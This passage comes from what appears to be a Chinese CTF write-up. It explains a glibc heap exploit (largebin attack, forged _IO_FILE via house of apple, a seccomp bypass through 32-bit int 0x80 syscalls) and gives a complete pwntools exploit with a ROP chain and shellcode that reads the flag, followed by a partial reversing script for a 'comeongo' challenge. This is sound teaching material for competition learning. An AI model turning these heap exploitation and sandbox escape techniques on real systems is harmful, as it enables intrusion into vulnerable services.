由于一个缓冲区大小是0x400，所以当scanf读入的数据大小大于等于0x400的时候，缓冲区不够存放，就会另外申请一个0x800的大堆块存放数据，然后再free掉。
可以通过上述scanf的特性，通过申请大堆块，使得unsorted bin中的堆块进入largebin中。因此很容易完成largebin attack，然后伪造_IO_FILE，通过exit触发，这里采用了house of apple的调用链。
32位部分的沙盒，seccomp-tools还是按64位的系统调用号显示的，转换如下：</p><p><img src=/img/2022-11-06-NTFY/41.png alt></p><p>通过int 0x80可以切换到32位，也就可以用open了。这里先用mmap2开辟32位空间给rsp，因为后面是32位系统调用且涉及栈操作（mmap2不涉及栈操作，所以rsp是64位地址也行），故栈需要是32位地址，不然会出错。然后open当前目录，用getents读取到rsp，就是之前mmap2开辟的32位地址空间上。打出目录下的所有文件名后，找到flag文件名的偏移，最后用64位的read和write输出即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#io = process(&#34;./pwn&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;172.51.122.123&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.31.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=n>remark</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Size: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Remark: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>remark</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=n>remark</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Remark: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>remark</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mh>0x610</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mh>0x600</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl>	<span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Content: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mi>96</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>	<span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>heap_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x290</span>
</span></span><span class=line><span class=cl>	<span class=n>success</span><span class=p>(</span><span class=s2>&#34;heap_base:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>fake_IO_addr</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0xed0</span>
</span></span><span class=line><span class=cl>	<span class=n>rop_address</span> <span class=o>=</span> <span class=n>fake_IO_addr</span> <span class=o>+</span> <span class=mh>0xe0</span> <span class=o>+</span> <span class=mh>0xe8</span> <span class=o>+</span> <span class=mh>0x70</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x26b72</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rsi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x27529</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rdx_r12_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x11c371</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>rop</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_r12_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_IO_addr</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_r12_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	<span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_address</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=p>)</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>		mov rax, 0xc0
</span></span></span><span class=line><span class=cl><span class=s1>		mov rbx, 0x500000
</span></span></span><span class=line><span class=cl><span class=s1>		mov rcx, 0x5000
</span></span></span><span class=line><span class=cl><span class=s1>		mov rdx, 3
</span></span></span><span class=line><span class=cl><span class=s1>		mov rsi, 1048610
</span></span></span><span class=line><span class=cl><span class=s1>		xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s1>		xor rbp, rbp
</span></span></span><span class=line><span class=cl><span class=s1>		int 0x80
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>		mov rsp, 0x500a00
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>		mov rax, 5
</span></span></span><span class=line><span class=cl><span class=s1>		push 0x2e
</span></span></span><span class=line><span class=cl><span class=s1>		mov rbx, rsp
</span></span></span><span class=line><span class=cl><span class=s1>		xor rcx, rcx
</span></span></span><span class=line><span class=cl><span class=s1>		int 0x80
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>		mov rbx, rax
</span></span></span><span class=line><span class=cl><span class=s1>		mov rax, 0x8d
</span></span></span><span class=line><span class=cl><span class=s1>		mov rcx, rsp
</span></span></span><span class=line><span class=cl><span class=s1>		mov rdx, 0x1337
</span></span></span><span class=line><span class=cl><span class=s1>		int 0x80
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>		add rcx, 106
</span></span></span><span class=line><span class=cl><span class=s1>		
</span></span></span><span class=line><span class=cl><span class=s1>		mov rax, 5
</span></span></span><span class=line><span class=cl><span class=s1>		mov rbx, rcx
</span></span></span><span class=line><span class=cl><span class=s1>		xor rcx, rcx
</span></span></span><span class=line><span class=cl><span class=s1>		xor rdx, rdx
</span></span></span><span class=line><span class=cl><span class=s1>		int 0x80
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>		mov rdi, rax
</span></span></span><span class=line><span class=cl><span class=s1>		mov rsi, rsp
</span></span></span><span class=line><span class=cl><span class=s1>		mov rdx, 0x100
</span></span></span><span class=line><span class=cl><span class=s1>		xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s1>		syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>		mov rdi, 1
</span></span></span><span class=line><span class=cl><span class=s1>		mov rax, 1
</span></span></span><span class=line><span class=cl><span class=s1>		syscall
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>	<span class=n>leave_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x5aa48</span>
</span></span><span class=line><span class=cl>	<span class=n>_lock</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x1ee4b0</span>
</span></span><span class=line><span class=cl>	<span class=n>magic_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x157d70</span> <span class=o>+</span> <span class=mi>26</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>	mov    rbp,QWORD PTR [rdi+0x48]
</span></span></span><span class=line><span class=cl><span class=s1>	mov    rax,QWORD PTR [rbp+0x18]
</span></span></span><span class=line><span class=cl><span class=s1>	lea    r13,[rbp+0x10]
</span></span></span><span class=line><span class=cl><span class=s1>	mov    DWORD PTR [rbp+0x10],0x0
</span></span></span><span class=line><span class=cl><span class=s1>	mov    rdi,r13
</span></span></span><span class=line><span class=cl><span class=s1>	call   QWORD PTR [rax+0x28]
</span></span></span><span class=line><span class=cl><span class=s1>	&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>	<span class=n>_IO_wfile_jumps</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x1ecf60</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>_lock</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_IO_addr</span> <span class=o>+</span> <span class=mh>0xe0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>_IO_wfile_jumps</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd0</span> <span class=o>+</span> <span class=mh>0xe0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_IO_addr</span> <span class=o>+</span> <span class=mh>0xe0</span> <span class=o>+</span> <span class=mh>0xe8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd0</span> <span class=o>+</span> <span class=mh>0xe8</span> <span class=o>+</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>magic_gadget</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>+=</span> <span class=n>rop</span> <span class=o>+</span> <span class=n>shellcode</span>
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>quit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=rev>Rev</h1><h2 id=comeongo>comeongo</h2><p>check1
取name和password的前4位拼接之后base58加密对比
得到name和password的前8位
check2
再依次取4位拼接base64加密，输入之后与X051YmNmRnE=对比
解密将数据带入测试，发现加密后的实际结果为_BinorRe
再将_BinorRe带入发现输入正确
check2取最后四位相加比较以及相差验证，password最后的前两位储存在内存里面</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=p>[</span><span class=mh>0xDD</span><span class=p>,</span> <span class=mh>0x8F</span><span class=p>,</span> <span class=mh>0xA1</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>=</span><span class=s1>&#39;vG&#39;</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>=</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>-</span><span class=n>i</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>+=</span><span class=nb>chr</span><span class=p>((</span><span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>[</span><span class=mi>0</span><span class=p>])))</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>+=</span><span class=nb>chr</span><span class=p>((</span><span class=n>a</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>[</span><span class=mi>1</span><span class=p>])))</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>+=</span><span class=nb>chr</span><span class=p>((</span><span class=n>a</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=mh>0x3f</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>+=</span><span class=nb>chr</span><span class=p>((</span><span class=n>a</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=mh>0x3f</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>+=</span><span class=nb>chr</span><span class=p>((</span><span class=n>a</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>-</span><span class=mh>0x1f</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span><span class=p>)</span>
